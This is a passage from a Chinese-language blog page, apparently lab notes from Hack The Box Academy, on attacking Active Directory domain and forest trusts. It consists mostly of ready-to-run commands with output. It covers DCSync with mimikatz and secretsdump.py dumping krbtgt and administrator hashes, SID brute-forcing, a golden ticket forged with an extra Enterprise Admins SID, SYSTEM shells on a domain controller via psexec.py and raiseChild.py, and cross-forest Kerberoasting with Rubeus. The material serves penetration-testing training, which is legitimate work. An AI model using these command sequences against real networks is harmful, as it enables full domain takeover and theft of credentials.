class="hljs-number">2</span>+xps6WS/NNf1vZtUV/KRLlWsL5v91jmzGiZQcENkLeozZ7kIsY/zadFqVnrnQqsd97qcLYktZ4yOYpxH43JYS2e+cXZ+NXLKxex37HQF5aNP7EITdjQds0lbyb9K/iUY27iyw7dRVLz3y5Dic4S4+cvJBSz6Y1zJHpLkDfYVQbBUCfUps8ImJijHf+jggEhMIIBHaADAgEAooIBFASCARB9ggEMMIIBCKCCAQQwggEAMIH9oBswGaADAgEXoRIEEBrCyB2TJTKolmppTTXOXQShHxsdTE9HSVNUSUNTLklOTEFORUZSRUlHSFQuTE9DQUyiEzARoAMCAQGhCjAIGwZoYWNrZXKjBwMFAEDgAACkERgPMjAyMjAzMjkxNzA2NDFapREYDzIwMjIwMzI5MTcwNjQxWqYRGA8yMDIyMDMzMDAzMDY0MVqnERgPMjAyMjA0MDUxNzA2NDFaqB8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxPQ0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA==<br><br>[+] Ticket successfully imported!<br></code></pre></td></tr></table></figure>

<h3 id="使用-klist-确认票据在内存中"><a href="#使用-klist-确认票据在内存中" class="headerlink" title="使用 klist 确认票据在内存中"></a>使用 klist 确认票据在内存中</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; klist<br><br>Current LogonId is <span class="hljs-number">0</span>:<span class="hljs-number">0</span>xf6495<br><br>Cached Tickets: (<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#0&gt;	Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL</span><br>	Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL <span class="hljs-selector-tag">@</span> LOGISTICS.INLANEFREIGHT.LOCAL<br>	KerbTicket Encryption <span class="hljs-built_in">Type</span>: RSADSI RC4<span class="hljs-literal">-HMAC</span>(NT)<br>	Ticket Flags <span class="hljs-number">0</span>x40e00000 -&gt; forwardable renewable initial pre_authent <br>	<span class="hljs-built_in">Start</span> Time: <span class="hljs-number">3</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2022</span> <span class="hljs-number">10</span>:<span class="hljs-number">06</span>:<span class="hljs-number">41</span> (local)<br>	<span class="hljs-keyword">End</span> Time:   <span class="hljs-number">3</span>/<span class="hljs-number">29</span>/<span class="hljs-number">2022</span> <span class="hljs-number">20</span>:<span class="hljs-number">06</span>:<span class="hljs-number">41</span> (local)<br>	Renew Time: <span class="hljs-number">4</span>/<span class="hljs-number">5</span>/<span class="hljs-number">2022</span> <span class="hljs-number">10</span>:<span class="hljs-number">06</span>:<span class="hljs-number">41</span> (local)<br>	Session Key <span class="hljs-built_in">Type</span>: RSADSI RC4<span class="hljs-literal">-HMAC</span>(NT)<br>	Cache Flags: <span class="hljs-number">0</span>x1 -&gt; PRIMARY <br>	Kdc Called: <br></code></pre></td></tr></table></figure>

<h3 id="执行-DCSync-攻击"><a href="#执行-DCSync-攻击" class="headerlink" title="执行 DCSync 攻击"></a>执行 DCSync 攻击</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Tools\mimikatz\x64&gt; .\mimikatz.exe<br><br>  .<span class="hljs-comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br> .<span class="hljs-comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br> <span class="hljs-comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br> <span class="hljs-comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br> <span class="hljs-string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )<br>  <span class="hljs-string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/<br><br>mimikatz <span class="hljs-comment"># lsadump::dcsync /user:INLANEFREIGHT\lab_adm</span><br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain<br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server<br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;INLANEFREIGHT\lab_adm&#x27;</span> will be the user account<br>[<span class="hljs-type">rpc</span>] Service  : ldap<br>[<span class="hljs-type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="hljs-number">9</span>)<br><br>Object RDN           : lab_adm<br><br>** SAM ACCOUNT **<br><br>SAM Username         : lab_adm<br>Account <span class="hljs-built_in">Type</span>         : <span class="hljs-number">30000000</span> ( USER_OBJECT )<br>User Account Control : <span class="hljs-number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )<br>Account expiration   :<br>Password last change : <span class="hljs-number">2</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">10</span>:<span class="hljs-number">53</span>:<span class="hljs-number">21</span> PM<br>Object Security ID   : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1001</span><br>Object Relative ID   : <span class="hljs-number">1001</span><br><br>Credentials:<br>  Hash NTLM: <span class="hljs-number">663715</span>a1a8b957e8e9943cc98ea451b6<br>    ntlm- <span class="hljs-number">0</span>: <span class="hljs-number">663715</span>a1a8b957e8e9943cc98ea451b6<br>    ntlm- <span class="hljs-number">1</span>: <span class="hljs-number">663715</span>a1a8b957e8e9943cc98ea451b6<br>    lm  - <span class="hljs-number">0</span>: <span class="hljs-number">6053227</span>db44e996fe16b107d9d1e95a0<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs powershell">mimikatz <span class="hljs-comment"># lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL</span><br><br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain<br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server<br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;INLANEFREIGHT\lab_adm&#x27;</span> will be the user account<br>[<span class="hljs-type">rpc</span>] Service  : ldap<br>[<span class="hljs-type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="hljs-number">9</span>)<br><br>Object RDN           : lab_adm<br><br>** SAM ACCOUNT **<br><br>SAM Username         : lab_adm<br>Account <span class="hljs-built_in">Type</span>         : <span class="hljs-number">30000000</span> ( USER_OBJECT )<br>User Account Control : <span class="hljs-number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )<br>Account expiration   :<br>Password last change : <span class="hljs-number">2</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">10</span>:<span class="hljs-number">53</span>:<span class="hljs-number">21</span> PM<br>Object Security ID   : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-1001</span><br>Object Relative ID   : <span class="hljs-number">1001</span><br><br>Credentials:<br>  Hash NTLM: <span class="hljs-number">663715</span>a1a8b957e8e9943cc98ea451b6<br>    ntlm- <span class="hljs-number">0</span>: <span class="hljs-number">663715</span>a1a8b957e8e9943cc98ea451b6<br>    ntlm- <span class="hljs-number">1</span>: <span class="hljs-number">663715</span>a1a8b957e8e9943cc98ea451b6<br>    lm  - <span class="hljs-number">0</span>: <span class="hljs-number">6053227</span>db44e996fe16b107d9d1e95a0<br></code></pre></td></tr></table></figure>

<h2 id="Linux下域信任攻击"><a href="#Linux下域信任攻击" class="headerlink" title="Linux下域信任攻击"></a>Linux下域信任攻击</h2><h3 id="使用-secretsdump-py-执行-DCSync"><a href="#使用-secretsdump-py-执行-DCSync" class="headerlink" title="使用 secretsdump.py 执行 DCSync"></a>使用 secretsdump.py 执行 DCSync</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt<br><br>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation<br><br>Password:<br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::<br>[*] Kerberos keys grabbed<br>krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8<br>krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e<br>krbtgt:des-cbc-md5:fee04c3d026d7538<br>[*] Cleaning up...<br></code></pre></td></tr></table></figure>

<h3 id="使用-lookupsid-py-进行-SID-暴力破解"><a href="#使用-lookupsid-py-进行-SID-暴力破解" class="headerlink" title="使用 lookupsid.py 进行 SID 暴力破解"></a>使用 lookupsid.py 进行 SID 暴力破解</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 <br><br>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation<br><br>Password:<br>[*] Brute forcing SIDs at 172.16.5.240<br>[*] StringBinding ncacn_np:172.16.5.240[\pipe\lsarpc]<br>[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689<br>500: LOGISTICS\Administrator (SidTypeUser)<br>501: LOGISTICS\Guest (SidTypeUser)<br>502: LOGISTICS\krbtgt (SidTypeUser)<br>512: LOGISTICS\Domain Admins (SidTypeGroup)<br>513: LOGISTICS\Domain Users (SidTypeGroup)<br>514: LOGISTICS\Domain Guests (SidTypeGroup)<br>515: LOGISTICS\Domain Computers (SidTypeGroup)<br>516: LOGISTICS\Domain Controllers (SidTypeGroup)<br>517: LOGISTICS\Cert Publishers (SidTypeAlias)<br>520: LOGISTICS\Group Policy Creator Owners (SidTypeGroup)<br>521: LOGISTICS\Read-only Domain Controllers (SidTypeGroup)<br>522: LOGISTICS\Cloneable Domain Controllers (SidTypeGroup)<br>525: LOGISTICS\Protected Users (SidTypeGroup)<br>526: LOGISTICS\Key Admins (SidTypeGroup)<br>553: LOGISTICS\RAS and IAS Servers (SidTypeAlias)<br>571: LOGISTICS\Allowed RODC Password Replication Group (SidTypeAlias)<br>572: LOGISTICS\Denied RODC Password Replication Group (SidTypeAlias)<br>1001: LOGISTICS\lab_adm (SidTypeUser)<br>1002: LOGISTICS\ACADEMY-EA-DC02$ (SidTypeUser)<br>1103: LOGISTICS\DnsAdmins (SidTypeAlias)<br>1104: LOGISTICS\DnsUpdateProxy (SidTypeGroup)<br>1105: LOGISTICS\INLANEFREIGHT$ (SidTypeUser)<br>1106: LOGISTICS\htb-student_adm (SidTypeUser)<br></code></pre></td></tr></table></figure>

<h3 id="查找域安全标识符-Domain-SID"><a href="#查找域安全标识符-Domain-SID" class="headerlink" title="查找域安全标识符 (Domain SID)"></a>查找域安全标识符 (Domain SID)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep <span class="hljs-string">&quot;Domain SID&quot;</span><br><br>Password:<br><br>[*] Domain SID is: S-1-5-21-2806153819-209893948-92287268<br></code></pre></td></tr></table></figure>

<h3 id="获取域安全标识符（SID）并附加到企业管理员-RID"><a href="#获取域安全标识符（SID）并附加到企业管理员-RID" class="headerlink" title="获取域安全标识符（SID）并附加到企业管理员 RID"></a>获取域安全标识符（SID）并附加到企业管理员 RID</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 <span class="hljs-string">&quot;Enterprise Admins&quot;</span><br><br>Password:<br>[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114<br>498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)<br>500: INLANEFREIGHT\administrator (SidTypeUser)<br>501: INLANEFREIGHT\guest (SidTypeUser)<br>502: INLANEFREIGHT\krbtgt (SidTypeUser)<br>512: INLANEFREIGHT\Domain Admins (SidTypeGroup)<br>513: INLANEFREIGHT\Domain Users (SidTypeGroup)<br>514: INLANEFREIGHT\Domain Guests (SidTypeGroup)<br>515: INLANEFREIGHT\Domain Computers (SidTypeGroup)<br>516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)<br>517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)<br>518: INLANEFREIGHT\Schema Admins (SidTypeGroup)<br>519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)<br></code></pre></td></tr></table></figure>

<h3 id="使用-ticketer-py-构建黄金票据"><a href="#使用-ticketer-py-构建黄金票据" class="headerlink" title="使用 ticketer.py 构建黄金票据"></a>使用 ticketer.py 构建黄金票据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker<br><br>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation<br><br>[*] Creating basic skeleton ticket and PAC Infos<br>[*] Customizing ticket <span class="hljs-keyword">for</span> LOGISTICS.INLANEFREIGHT.LOCAL/hacker<br>[*] 	PAC_LOGON_INFO<br>[*] 	PAC_CLIENT_INFO_TYPE<br>[*] 	EncTicketPart<br>[*] 	EncAsRepPart<br>[*] Signing/Encrypting final ticket<br>[*] 	PAC_SERVER_CHECKSUM<br>[*] 	PAC_PRIVSVR_CHECKSUM<br>[*] 	EncTicketPart<br>[*] 	EncASRepPart<br>[*] Saving ticket <span class="hljs-keyword">in</span> hacker.ccache<br></code></pre></td></tr></table></figure>

<h3 id="设置-KRB5CCNAME-环境变量-1"><a href="#设置-KRB5CCNAME-环境变量-1" class="headerlink" title="设置 KRB5CCNAME 环境变量"></a>设置 KRB5CCNAME 环境变量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ <span class="hljs-built_in">export</span> KRB5CCNAME=hacker.ccache <br></code></pre></td></tr></table></figure>

<h3 id="使用-Impacket-的-psexec-py-获取-SYSTEM-shell"><a href="#使用-Impacket-的-psexec-py-获取-SYSTEM-shell" class="headerlink" title="使用 Impacket 的 psexec.py 获取 SYSTEM shell"></a>使用 Impacket 的 psexec.py 获取 SYSTEM shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5<br><br>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation<br><br>[*] Requesting shares on 172.16.5.5.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file nkYjGWDZ.exe<br>[*] Opening SVCManager on 172.16.5.5.....<br>[*] Creating service eTCU on 172.16.5.5.....<br>[*] Starting service eTCU.....<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [Version 10.0.17763.107]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt; <span class="hljs-built_in">whoami</span><br>nt authority\system<br><br>C:\Windows\system32&gt; hostname<br>ACADEMY-EA-DC01<br></code></pre></td></tr></table></figure>

<h3 id="使用-raiseChild-py-执行攻击"><a href="#使用-raiseChild-py-执行攻击" class="headerlink" title="使用 raiseChild.py 执行攻击"></a>使用 raiseChild.py 执行攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm<br><br>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation<br><br>Password:<br>[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL<br>[*] Forest FQDN is: INLANEFREIGHT.LOCAL<br>[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL<br>[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519<br>[*] Getting credentials <span class="hljs-keyword">for</span> LOGISTICS.INLANEFREIGHT.LOCAL<br>LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::<br>LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8<br>[*] Getting credentials <span class="hljs-keyword">for</span> INLANEFREIGHT.LOCAL<br>INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::<br>INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d<br>[*] Target User account name is administrator<br>INLANEFREIGHT.LOCAL/administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::<br>INLANEFREIGHT.LOCAL/administrator:aes256-cts-hmac-sha1-96s:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6<br>[*] Opening PSEXEC shell at ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL<br>[*] Requesting shares on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file BnEGssCE.exe<br>[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....<br>[*] Creating service UVNb on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....<br>[*] Starting service UVNb.....<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [Version 10.0.17763.107]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt;<span class="hljs-built_in">whoami</span><br>nt authority\system<br><br>C:\Windows\system32&gt;<span class="hljs-built_in">exit</span><br>[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0<br>[*] Opening SVCManager on ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.....<br>[*] Stopping service UVNb.....<br>[*] Removing service UVNb.....<br></code></pre></td></tr></table></figure>

<h1 id="打破界限-跨林攻击"><a href="#打破界限-跨林攻击" class="headerlink" title="打破界限 - 跨林攻击"></a>打破界限 - 跨林攻击</h1><h2 id="跨林-Kerberoasting"><a href="#跨林-Kerberoasting" class="headerlink" title="跨林 Kerberoasting"></a>跨林 Kerberoasting</h2><p>Kerberos 攻击，如 Kerberoasting 和 ASREPRoasting，可以在信任关系的基础上进行跨域操作，具体取决于信任方向。当你处于一个具有入站或双向域&#x2F;林信任的域中时，你很可能能够执行各种攻击以获取立足点。有时你可能无法在当前域中提升权限，但可以获取另一个域中的 Kerberos 票据并破解哈希，从而获得在两个域中均具有域&#x2F;企业管理员权限的管理员用户。</p>
<h3 id="使用-Get-DomainUser-枚举关联-SPN-的账户"><a href="#使用-Get-DomainUser-枚举关联-SPN-的账户" class="headerlink" title="使用 Get-DomainUser 枚举关联 SPN 的账户"></a>使用 Get-DomainUser 枚举关联 SPN 的账户</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-SPN</span> <span class="hljs-literal">-Domain</span> FREIGHTLOGISTICS.LOCAL | <span class="hljs-built_in">select</span> SamAccountName<br><br>samaccountname<br><span class="hljs-literal">--------------</span><br>krbtgt<br>mssqlsvc<br></code></pre></td></tr></table></figure>

<h3 id="枚举-mssqlsvc-账户"><a href="#枚举-mssqlsvc-账户" class="headerlink" title="枚举 mssqlsvc 账户"></a>枚举 mssqlsvc 账户</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Domain</span> FREIGHTLOGISTICS.LOCAL <span class="hljs-literal">-Identity</span> mssqlsvc |<span class="hljs-built_in">select</span> samaccountname,memberof<br><br>samaccountname memberof<br><span class="hljs-literal">--------------</span> <span class="hljs-literal">--------</span><br>mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL<br></code></pre></td></tr></table></figure>

<h3 id="使用-Rubeus-进行-Kerberoasting-攻击并使用-domain-标志"><a href="#使用-Rubeus-进行-Kerberoasting-攻击并使用-domain-标志" class="headerlink" title="使用 Rubeus 进行 Kerberoasting 攻击并使用 &#x2F;domain 标志"></a>使用 Rubeus 进行 Kerberoasting 攻击并使用 &#x2F;domain 标志</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap<br><br>   ______        _<br>  (_____ \      | |<br>   _____) )_   _| |__  _____ _   _  ___<br>  |  __  /| | | |  _ \| ___ | | | |/___)<br>  | |  \ \| |_| | |_) ) ____| |_| |___ |<br>  |_|   |_|____/|____/|_____)____/(___/<br><br>  v2.<span class="hljs-number">0.2</span><br><br>[*] Action: Kerberoasting<br><br>[*] NOTICE: AES hashes will be returned <span class="hljs-keyword">for</span> AES<span class="hljs-literal">-enabled</span> accounts.<br>[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC <span class="hljs-keyword">for</span> these accounts.<br><br>[*] Target User            : mssqlsvc<br>[*] Target Domain          : FREIGHTLOGISTICS.LOCAL<br>[*] Searching path <span class="hljs-string">&#x27;LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#x27;</span><br><br>[*] Total kerberoastable users : <span class="hljs-number">1</span><br><br>[*] SamAccountName         : mssqlsvc<br>[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL<br>[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:<span class="hljs-number">1433</span><br>[*] PwdLastSet             : <span class="hljs-number">3</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">12</span>:<span class="hljs-number">47</span>:<span class="hljs-number">52</span> PM<br>[*] Supported ETypes       : RC4_HMAC_DEFAULT<br>[*] Hash                   : <span class="hljs-variable">$krb5tgs</span><span class="hljs-variable">$23</span><span class="hljs-variable">$</span>*mssqlsvc<span class="hljs-variable">$FREIGHTLOGISTICS</span>.LOCAL<span 